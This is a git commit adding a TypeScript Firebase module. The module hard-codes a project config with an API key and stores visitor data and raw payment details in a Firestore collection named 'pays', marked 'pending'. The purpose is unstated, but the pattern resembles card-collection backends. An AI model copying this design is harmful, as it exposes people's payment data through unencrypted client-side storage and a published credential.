490f2f0a3e18d04b0620eed4d2e000f06e31675a
moathssnck <myneww00@gmail.com>
2025-07-10 10:21:55 -0600

    ssss

---
+++ lib/firebase.ts
@@ -0,0 +1,50 @@
+// firebase.js
+import { getApp, getApps, initializeApp } from "firebase/app";
+import { getDatabase } from "firebase/database";
+import { doc, getFirestore, setDoc } from "firebase/firestore";
+
+const firebaseConfig = {
+    apiKey: "AIzaSyApD3fjhn3FxxC6AKwnZLEHe4hIYzMxeUo",
+  authDomain: "zain0-1.firebaseapp.com",
+  projectId: "zain0-1",
+  storageBucket: "zain0-1.firebasestorage.app",
+  messagingSenderId: "662580050481",
+  appId: "1:662580050481:web:d9b76049895848b69e7310",
+  measurementId: "G-T80Y652HR2"
+};
+
+const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+const db = getFirestore(app);
+const database = getDatabase(app);
+
+export async function addData(data: any) {
+  localStorage.setItem("visitor", data.id);
+  try {
+    const docRef = await doc(db, "pays", data.id!);
+    await setDoc(docRef, data, { merge: true });
+
+    console.log("Document written with ID: ", docRef.id);
+    // You might want to show a success message to the user here
+  } catch (e) {
+    console.error("Error adding document: ", e);
+    // You might want to show an error message to the user here
+  }
+}
+export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
+  try {
+    const visitorId = localStorage.getItem("visitor");
+    if (visitorId) {
+      const docRef = doc(db, "pays", visitorId);
+      await setDoc(
+        docRef,
+        { ...paymentInfo, status: "pending" },
+        { merge: true }
+      );
+      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
+    }
+  } catch (error) {
+    console.error("Error adding document: ", error);
+    alert("Error adding payment info to Firestore");
+  }
+};
+export { db, database };
